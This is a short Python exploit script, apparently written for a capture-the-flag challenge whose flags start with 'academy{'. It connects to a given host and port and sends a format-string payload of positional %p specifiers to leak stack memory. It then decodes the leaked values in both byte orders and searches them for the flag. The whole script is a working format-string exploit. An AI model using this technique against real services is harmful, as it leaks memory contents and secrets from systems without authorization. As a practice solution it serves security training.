import socket, re, sys, time

HOST, PORT = sys.argv[1], int(sys.argv[2])
N = int(sys.argv[3]) if len(sys.argv) > 3 else 40

fmt = "".join("%%%d$p" % i for i in range(1, N + 1)).encode()
print("payload len:", len(fmt))

s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(5)
time.sleep(0.4)


def drain(t=1.2):
    s.settimeout(t)
    out = b""
    try:
        while True:
            d = s.recv(8192)
            if not d:
                break
            out += d
    except Exception:
        pass
    return out


print(drain().decode(errors="replace")[:400])
s.sendall(b"1\n")
time.sleep(0.5)
out1 = drain()
print(out1.decode(errors="replace")[:600])
s.sendall(fmt + b"\n")
time.sleep(0.5)
out = drain(2.5)
txt = out.decode(errors="replace")
print("=== RAW (first 1500) ===")
print(txt[:1500])

toks = re.findall(r"0x[0-9a-fA-F]+", txt.split("Buying stonks with token:")[-1][:4000])
print("=== %d tokens ===" % len(toks))
raw = b""
for t in toks:
    v = int(t, 16)
    raw += (v & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
print("decoded little-endian:")
print(raw)
idx = raw.find(b"academy{")
print("academy{ at", idx)
if idx >= 0:
    print("FLAG CANDIDAT:", raw[idx:raw.find(b'}', idx) + 1])
# aussi en big-endian, au cas ou
raw2 = b"".join(int(t, 16).to_bytes(8, "big") for t in toks)
i2 = raw2.find(b"academy{")
print("BE academy{ at", i2)
if i2 >= 0:
    print("FLAG CANDIDAT BE:", raw2[i2:raw2.find(b'}', i2) + 1])
s.close()
